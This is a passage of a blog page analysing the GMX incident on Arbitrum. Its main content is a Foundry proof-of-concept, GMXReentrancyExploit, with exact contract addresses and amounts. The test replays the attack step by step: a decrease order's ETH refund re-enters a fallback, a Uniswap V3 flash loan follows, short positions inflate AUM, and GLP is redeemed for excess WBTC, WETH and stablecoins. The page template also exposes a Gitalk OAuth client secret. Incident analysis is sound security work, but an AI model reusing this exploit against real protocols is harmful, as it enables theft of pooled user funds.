class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;./../../interface.sol&quot;;</span><br><span class="line">import &quot;./interface_gmx.sol&quot;;</span><br><span class="line">import &#123;Test, console&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GMXReentrancyExploit is Test &#123;</span><br><span class="line">    // 代币合约</span><br><span class="line">    IERC20 GLP = IERC20(0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258);</span><br><span class="line">    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);</span><br><span class="line">    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);</span><br><span class="line">    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);</span><br><span class="line">    IERC20 Circle_USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);</span><br><span class="line">    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);</span><br><span class="line">    IERC20 USDC_e = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);</span><br><span class="line">    IERC20 LINK = IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);</span><br><span class="line">    IERC20 UNI = IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);</span><br><span class="line">    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);</span><br><span class="line">    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    // GMX合约</span><br><span class="line">    IVault Vault = IVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);</span><br><span class="line">    IPositionManager PositionManager = IPositionManager(0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C);</span><br><span class="line">    IGlpManager GlpManager = IGlpManager(0x3963FfC9dff443c2A94f21b129D429891E32ec18);</span><br><span class="line">    IOrderBook OrderBook = IOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);</span><br><span class="line">    IGMXRouter Router = IGMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);</span><br><span class="line">    IRewardRouter RewardRouter = IRewardRouter(0xB95DB5B167D75e6d04227CfFFA61069348d271F5);</span><br><span class="line">    IUniswapV3Pool UniswapV3Pool = IUniswapV3Pool(0xC6962004f452bE9203591991D15f6b388e09E8D0);</span><br><span class="line">    IPositionRouter PositionRouter = IPositionRouter(0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868);</span><br><span class="line">    address KeeperBot = 0xd4266F8F82F7405429EE18559e548979D49160F3;</span><br><span class="line">    </span><br><span class="line">    // 攻击状态</span><br><span class="line">    bool private inReentrancy = false;</span><br><span class="line">    bool private attackExecuted = false;</span><br><span class="line">    uint256 private flashLoanAmount = 7538000 * 1e6; // 7.538M USDC</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        console.log(&quot;=== Setting up GMX Reentrancy Attack Test ===&quot;);</span><br><span class="line">        //vm.createSelectFork(&quot;arbitrum&quot;, 355_878_385);</span><br><span class="line">        vm.createSelectFork(&quot;arbitrum&quot;, 355_880_237);</span><br><span class="line">        console.log(&quot;Forked Arbitrum at block: 355_878_385&quot;);</span><br><span class="line">        </span><br><span class="line">        // 设置标签</span><br><span class="line">        vm.label(address(GLP), &quot;GLP&quot;);</span><br><span class="line">        vm.label(address(WBTC), &quot;WBTC&quot;);</span><br><span class="line">        vm.label(address(WETH), &quot;WETH&quot;);</span><br><span class="line">        vm.label(address(USDC), &quot;USDC&quot;);</span><br><span class="line">        vm.label(address(USDC_e), &quot;USDC_e&quot;);</span><br><span class="line">        vm.label(address(USDT), &quot;USDT&quot;);</span><br><span class="line">        vm.label(address(LINK), &quot;LINK&quot;);</span><br><span class="line">        vm.label(address(UNI), &quot;UNI&quot;);</span><br><span class="line">        vm.label(address(FRAX), &quot;FRAX&quot;);</span><br><span class="line">        vm.label(address(DAI), &quot;DAI&quot;);</span><br><span class="line">        vm.label(address(Vault), &quot;GMX_Vault&quot;);</span><br><span class="line">        vm.label(address(PositionManager), &quot;GMX_PositionManager&quot;);</span><br><span class="line">        vm.label(address(GlpManager), &quot;GMX_GlpManager&quot;);</span><br><span class="line">        vm.label(address(OrderBook), &quot;GMX_OrderBook&quot;);</span><br><span class="line">        vm.label(address(Router), &quot;GMX_Router&quot;);</span><br><span class="line">        vm.label(address(RewardRouter), &quot;GMX_RewardRouter&quot;);</span><br><span class="line">        vm.label(address(UniswapV3Pool), &quot;UniswapV3Pool_USDC_WETH&quot;);</span><br><span class="line">        vm.label(address(PositionRouter), &quot;GMX_PositionRouter&quot;);</span><br><span class="line">        vm.label(address(KeeperBot), &quot;KeeperBot&quot;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Contract labels set&quot;);</span><br><span class="line">        console.log(&quot;Setup completed\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testReentrancyAttack() public &#123;</span><br><span class="line">        console.log(&quot;=== GMX Reentrancy Attack POC Started ===&quot;);</span><br><span class="line">        </span><br><span class="line">        // 记录初始状态</span><br><span class="line">        logPoolStatus(&quot;Test Start&quot;);</span><br><span class="line"></span><br><span class="line">        // 1. 准备初始资金</span><br><span class="line">        console.log(&quot;\n=== Step 1: Preparing Initial Funds ===&quot;);</span><br><span class="line">        deal(address(WETH), address(this), 1 ether);</span><br><span class="line">        deal(address(USDC), address(this), 10000 * 1e6);</span><br><span class="line">        deal(address(FRAX), address(this), 8_600_000 * 1e18);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;WETH balance:&quot;, WETH.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;USDC balance:&quot;, USDC.balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">        // 2. 首先创建一个仓位用于减仓</span><br><span class="line">        console.log(&quot;\n=== Step 2: Creating Initial Position ===&quot;);</span><br><span class="line">        _createInitialPosition();</span><br><span class="line">        </span><br><span class="line">        // 3. 创建减仓订单</span><br><span class="line">        console.log(&quot;\n=== Step 3: Creating Decrease Order ===&quot;);</span><br><span class="line">        _createDecreaseOrder();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _createInitialPosition() internal &#123;</span><br><span class="line">        console.log(&quot;Creating initial long position...&quot;);       </span><br><span class="line"></span><br><span class="line">        console.log(&quot;Initial Order: create increase order&quot;);</span><br><span class="line">        console.log(&quot;size_delta:531064000000000000000000000000000,amountIn:100000000000000000&quot;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        address[] memory _path_increase = new address[](1);</span><br><span class="line">        _path_increase[0] = address(WETH);</span><br><span class="line"></span><br><span class="line">        Router.approvePlugin(address(OrderBook));</span><br><span class="line">        OrderBook.createIncreaseOrder&#123;value: 0.1003 ether&#125;(</span><br><span class="line">            _path_increase,                     //_path</span><br><span class="line">            100000000000000000,                 //_amountIn</span><br><span class="line">            address(WETH),                      //_indexToken</span><br><span class="line">            0,                                  //_minOut</span><br><span class="line">            531064000000000000000000000000000,  //_sizeDelta</span><br><span class="line">            address(WETH),                      //_collateralToken</span><br><span class="line">            true,                               //_isLong</span><br><span class="line">            1500000000000000000000000000000000, //_triggerPrice</span><br><span class="line">            true,                               //_triggerAboveThreshold</span><br><span class="line">            300000000000000,                    //_execitionFee</span><br><span class="line">            true                                //_shouldWrap</span><br><span class="line">            );</span><br><span class="line">        </span><br><span class="line">        uint256 orderIndex = OrderBook.increaseOrdersIndex(address(this)) - 1;</span><br><span class="line">        vm.startPrank(KeeperBot);</span><br><span class="line">        PositionManager.executeIncreaseOrder(address(this),orderIndex,payable(KeeperBot));</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        // 验证仓位创建</span><br><span class="line"> </span><br><span class="line">        (uint256 size, uint256 collateral, uint256 avgPrice,,,,,) = Vault.getPosition(</span><br><span class="line">            address(this),</span><br><span class="line">            address(WETH),</span><br><span class="line">            address(WETH),</span><br><span class="line">            true</span><br><span class="line">        );</span><br><span class="line">        console.log(&quot;Position created - Size:&quot;, size);</span><br><span class="line">        console.log( &quot;Collateral:&quot;, collateral);</span><br><span class="line">        console.log( &quot;Avg Price:&quot;, avgPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    function _createDecreaseOrder() internal &#123;</span><br><span class="line">        console.log(&quot;Creating decrease order...&quot;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        // 获取当前仓位信息</span><br><span class="line">        (uint256 size, uint256 collateral, uint256 avgPrice,,,,,) = Vault.getPosition(</span><br><span class="line">            address(this),</span><br><span class="line">            address(WETH),</span><br><span class="line">            address(WETH),</span><br><span class="line">            true</span><br><span class="line">        );</span><br><span class="line">        require(size &gt; 0, &quot;No position to decrease&quot;);</span><br><span class="line">        </span><br><span class="line">        // 创建减仓订单 - 这个订单执行时会退款ETH，触发重入</span><br><span class="line">        Router.approvePlugin(address(OrderBook));</span><br><span class="line">        OrderBook.createDecreaseOrder&#123;value:0.0003 ether&#125;(</span><br><span class="line">            address(WETH),    // indexToken </span><br><span class="line">            size,             // sizeDelta </span><br><span class="line">            address(WETH),    // collateralToken    </span><br><span class="line">            26517133600000000000000000000000,                // collateralDelta</span><br><span class="line">            true,             // isLong</span><br><span class="line">            1500000000000000000000000000000000,                // triggerPrice - 市价订单</span><br><span class="line">            true             // triggerAboveThreshold</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        uint256 orderIndex = OrderBook.decreaseOrdersIndex(address(this)) - 1;</span><br><span class="line"></span><br><span class="line">        vm.startPrank(address(KeeperBot));</span><br><span class="line">        PositionManager.executeDecreaseOrder(address(this),orderIndex,payable(KeeperBot));</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        console.log(&quot;Decrease order created with index:&quot;, orderIndex);</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        console.log(&quot;Fallback called with value:&quot;, msg.value);</span><br><span class="line"></span><br><span class="line">        //FlashLoan</span><br><span class="line">        UniswapV3Pool.flash(</span><br><span class="line">            address(this),</span><br><span class="line">            0,              //WETH</span><br><span class="line">            7538567619570,  // USDC</span><br><span class="line">            abi.encode(&quot;attack&quot;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function uniswapV3FlashCallback(</span><br><span class="line">        uint256 fee0,</span><br><span class="line">        uint256 fee1,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external &#123;</span><br><span class="line">        // 大部分拿去mintGLP</span><br><span class="line">        Circle_USDC.approve(address(GlpManager), 6000000000000);</span><br><span class="line">        RewardRouter.mintAndStakeGlp(address(Circle_USDC), 6000000000000, 0, 0);</span><br><span class="line"></span><br><span class="line">        //剩下拿去开仓，通过size操控aum，进而影响GLP价格</span><br><span class="line">        Circle_USDC.transfer(address(Vault),1538567619570);</span><br><span class="line">        Vault.increasePosition(</span><br><span class="line">            address(this),</span><br><span class="line">            address(Circle_USDC), //CollateralToken</span><br><span class="line">            address(WBTC), //IndexToken</span><br><span class="line">            15385676195700000000000000000000000000, //sizeDelta</span><br><span class="line">            false</span><br><span class="line">        );</span><br><span class="line">        //查询aum</span><br><span class="line">        console.log(&quot;AUM after Vault.increasePosition:&quot;, GlpManager.getAum(false));</span><br><span class="line"></span><br><span class="line">        //通过放大的glp价格去赎回超额资产</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(WBTC), 386498977301112432466652, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(WETH), 341596270985668652106658, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(USDC_e), 7503268381089010018234, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(LINK), 13453659795811394287419, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(UNI), 21422748392865504694138, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(USDT), 53812436696917217624679, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(FRAX), 450568243197571194433982, 0, address(this));</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(DAI), 53603497139685496377262, 0, address(this));</span><br><span class="line"></span><br><span class="line">        Vault.decreasePosition(address(this), address(Circle_USDC), address(WBTC),0, 15385676195700000000000000000000000000, false, address(this));</span><br><span class="line">        FRAX.approve(address(GlpManager),9000000000000000000000000);</span><br><span class="line">        RewardRouter.mintAndStakeGlp(address(FRAX), 9000000000000000000000000, 0, 0);</span><br><span class="line">        Circle_USDC.transfer(address(Vault),500000000000);</span><br><span class="line">        Vault.increasePosition(address(this), address(Circle_USDC), address(WBTC), 12500000000000000000000000000000000000, false);</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(FRAX), 625160634213166340059183, 0, address(this));</span><br><span class="line">        Vault.decreasePosition(address(this), address(Circle_USDC), address(WBTC),0, 12500000000000000000000000000000000000, false, address(this));</span><br><span class="line">        </span><br><span class="line">        FRAX.approve(address(GlpManager), 9000000000000000000000000);</span><br><span class="line">        RewardRouter.mintAndStakeGlp(address(FRAX), 9000000000000000000000000, 0, 0);</span><br><span class="line">        Circle_USDC.transfer(address(Vault),500000000000);</span><br><span class="line">        Vault.increasePosition(address(this), address(Circle_USDC), address(WBTC), 12500000000000000000000000000000000000, false);</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(FRAX), 900073245171457173471826, 0, address(this));</span><br><span class="line">        Vault.decreasePosition(address(this), address(Circle_USDC), address(WBTC),0, 12500000000000000000000000000000000000, false, address(this));</span><br><span class="line"></span><br><span class="line">        FRAX.approve(address(GlpManager), 400000000000000000000000);</span><br><span class="line">        RewardRouter.mintAndStakeGlp(address(FRAX), 400000000000000000000000, 0, 0);</span><br><span class="line">        FRAX.transfer(address(Vault),10000000000000000000000);</span><br><span class="line">        Vault.increasePosition(address(this), address(FRAX), address(WBTC), 380000000000000000000000000000000000, false);</span><br><span class="line">        RewardRouter.unstakeAndRedeemGlp(address(Circle_USDC), 28776205561057925765426060, 0, address(this));</span><br><span class="line">        Vault.decreasePosition(address(this), address(Circle_USDC), address(WBTC),0, 380000000000000000000000000000000000, false, address(this));</span><br><span class="line">   </span><br><span class="line">        Circle_USDC.transfer(address(UniswapV3Pool),7542336903380);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 输出详细的池子状态</span><br><span class="line">    function logPoolStatus(string memory stage) public view &#123;</span><br><span class="line">        console.log(&quot;\n--- Pool Status at&quot;, stage, &quot;---&quot;);</span><br><span class="line">        </span><br><span class="line">        (uint256 globalShortSize, uint256 globalShortAvgPrice, uint256 currentPrice) = getGlobalShortData();</span><br><span class="line">        console.log(&quot;Global Short Size:&quot;, globalShortSize);</span><br><span class="line">        console.log(&quot;Global Short Avg Price:&quot;, globalShortAvgPrice);</span><br><span class="line">        console.log(&quot;Current WBTC Price:&quot;, currentPrice);</span><br><span class="line">        </span><br><span class="line">        uint256 initialAum = GlpManager.getAum(false);</span><br><span class="line">        console.log(&quot;Initial AUM:&quot;, initialAum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看全局空头数据</span><br><span class="line">    function getGlobalShortData() public view returns (uint256, uint256, uint256) &#123;</span><br><span class="line">        uint256 globalShortSize = Vault.globalShortSizes(address(WBTC));</span><br><span class="line">        uint256 globalShortAvgPrice = Vault.globalShortAveragePrices(address(WBTC));</span><br><span class="line">        uint256 currentPrice = Vault.getMaxPrice(address(WBTC));</span><br><span class="line">        </span><br><span class="line">        return (globalShortSize, globalShortAvgPrice, currentPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> GMX_IO Incident analysis &amp; POC</li>
+        <li><strong>Author:</strong> Chiu</li>
+        <li><strong>Created at
+                :</strong> 2025-07-12 16:33:43</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-22 16:38:51
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://github.com/Idealist17/github.io/2025/07/12/GMX_IO_Incident/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">#区块链</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/DeFi/">#DeFi</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">#攻击事件分析</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/06/20/Sashimi%20Swap%20Incident%20&amp;%20POC/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">SashimiSwap Incident &amp; POC</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'Ov23ctdJf8fChgcHijWU',
+                    clientSecret: 'ab085da53c1e5d5699612cc1a17d05a64daa0e25',
+                    repo: 'https://github.com/Idealist17/gitalk',
+                    owner: 'idealist17',
+                    admin: ['idealist17'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">GMX_IO Incident analysis &amp; POC</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%83%8C%E6%99%AF%E7%AE%80%E4%BB%8B"><span class="nav-text">1. 背景简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="nav-text">2. 漏洞根本原因分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Root-cause"><span class="nav-text">2.1 Root cause</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Contributing-factors-%EF%BC%9A"><span class="nav-text">2.2 Contributing factors ：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">2.3 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-POC"><span class="nav-text">3. POC</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Chiu</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        35 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
